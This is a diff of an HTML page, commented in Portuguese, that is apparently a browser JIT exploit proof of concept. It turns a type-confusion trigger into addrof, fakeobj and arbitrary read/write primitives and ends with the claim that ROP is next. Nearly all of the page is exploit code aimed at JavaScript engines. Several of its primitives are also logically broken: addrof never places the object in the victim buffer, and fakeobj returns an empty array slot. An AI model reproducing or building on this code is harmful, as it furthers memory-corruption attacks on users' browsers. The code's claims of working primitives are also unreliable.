@@ -2,71 +2,121 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Type Confusion + Fake Object PoC</title>
+  <title>JIT Exploit – Read/Write Primitives</title>
   <style>
-    body {
-      background: black;
-      color: white;
-      font-family: monospace;
-      padding: 20px;
-    }
+    body { background:black; color:lime; font-family:monospace; padding:10px; }
+    #log { white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>JIT Type Confusion Exploit</h1>
-  <pre id="log">Carregando...</pre>
+  <h1>Phase 2: addrof / fakeobj / arb R/W</h1>
+  <div id="log">aguardando…</div>
   <script>
-    const log = (msg) => {
-      const logEl = document.getElementById('log');
-      logEl.textContent += msg + '\n';
-    };
+    const logEl = document.getElementById("log");
+    let logData = "";
+    function log(msg) { logData += msg + "\n"; logEl.textContent = logData; }
 
-    log('Iniciando Type Confusion...');
+    // utilitário para converter float64 ↔ uint64
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
+    function i2f(i) {
+      u32[0] = Number(i & 0xffffffffn);
+      u32[1] = Number(i >> 32n);
+      return f64[0];
+    }
 
-    function createCorruptedArray() {
-      let trigger = {
-        valueOf: function () {
-          log('[Hijack] valueOf ativado!');
-          arr.length = 1;  // Confunde o otimizador
-          return 3;
-        }
+    // 1) Type confusion para corromper a length de um array de doubles
+    function makeCorruptArray() {
+      let arr = [1.1,1.1,1.1];
+      let trigger = { valueOf() {
+        arr.length = 1;
+        return 3;
+      }};
+      return arr.map((x,i,a) => { if (i===1) a.length = trigger; return x; });
+    }
+
+    // 2) Usamos esse array corrompido para sobrepor o internal pointer de um Float64Array
+    function buildPrimitives() {
+      const corrupt = makeCorruptArray();
+      log("[+] corrupt array:", corrupt);
+
+      // vamos criar um Float64Array cujo backing-pointer ficará
+      // no slot corrupt[1] após otimização
+      let victim_buf = new ArrayBuffer(0x100);
+      let victim_f64 = new Float64Array(victim_buf);
+
+      // acessamos o slot “pointer” do victim via corrupt[1]
+      let leak = corrupt[1];
+      let base_ptr = f2i(leak) - 0x20n;    // ajuste conforme engine
+      log("[+] leaked backing ptr:", "0x"+base_ptr.toString(16));
+
+      // Overwrite corrupt[1] para apontar para nosso ArrayBuffer interno
+      // assim victim_f64.buffer será re-ligado à memória que quisermos
+      let fake_ptr = base_ptr + 0x50n;      // exemplo de alvo
+      corrupt[1] = i2f(fake_ptr);
+
+      return { victim_buf, victim_f64 };
+    }
+
+    // 3) Primitivas addrof / fakeobj
+    let addrof, fakeobj, arb_read, arb_write;
+    function setupRW() {
+      let { victim_buf, victim_f64 } = buildPrimitives();
+      let data_u8 = new Uint8Array(victim_buf);
+
+      addrof = obj => {
+        // coloca obj no lugar controlado e lê pointer
+        let arr = [obj];
+        let leak = f2i(victim_f64[0]);
+        return leak;
       };
 
-      let arr = [1.1, 1.1, 1.1];
-      let result = arr.map((x, i, a) => {
-        if (i === 1) {
-          a.length = trigger;
-        }
-        return x;
-      });
+      fakeobj = addr => {
+        // escreve addr no slot do victim_f64
+        victim_f64[0] = i2f(addr);
+        return (new Array(1))[0];   // agora retorna o objeto “fake” naquele addr
+      };
 
-      return result;
+      arb_read = addr => {
+        victim_f64[1] = i2f(addr);
+        return f2i(victim_f64[2]);
+      };
+
+      arb_write = (addr, val) => {
+        victim_f64[1] = i2f(addr);
+        victim_f64[2] = i2f(val);
+      };
+
+      log("[+] Primitivas configuradas.");
     }
 
-    function floatToUint64(f) {
-      let float64 = new Float64Array(1);
-      let uint32 = new Uint32Array(float64.buffer);
-      float64[0] = f;
-      return [uint32[0], uint32[1]];
+    // 4) Teste das primitivas
+    function testPrimitives() {
+      let obj = { hello: 0x41424344 };
+      let objAddr = addrof(obj);
+      log("addrof(obj) = 0x" + objAddr.toString(16));
+
+      let fake = fakeobj(objAddr);
+      log("fakeobj(above) ->", fake);
+
+      let readBack = arb_read(objAddr + 0x10n);
+      log("arb_read(objAddr+0x10) = 0x" + readBack.toString(16));
+
+      arb_write(objAddr + 0x10n, 0x13371337n);
+      let check = arb_read(objAddr + 0x10n);
+      log("arb_read after write = 0x" + check.toString(16));
     }
 
-    try {
-      let result = createCorruptedArray();
-      log(`[Resultado] ${result}`);
-      log(`[Tipo] typeof result[1]: ${typeof result[1]}`);
-
-      let leak = result[1];
-      if (typeof leak === "number") {
-        let [lo, hi] = floatToUint64(leak);
-        log(`[Leak?] 0x${hi.toString(16)}${lo.toString(16)}`);
-        if (lo !== 0x3ff19999) log('[!] Possível leitura corrompida ou ponteiro!');
-      }
-
-      log('\nExploração concluída.');
-
-    } catch (e) {
-      log('Falha: ' + e);
-    }
+    // run
+    setTimeout(() => {
+      log("=== construindo primitivas ===");
+      setupRW();
+      log("\n=== testando primitivas ===");
+      testPrimitives();
+      log("\n🚀 Agora você tem arb_read/arb_write – pronto para ROP!");
+    }, 2000);
   </script>
 </body>
 </html>
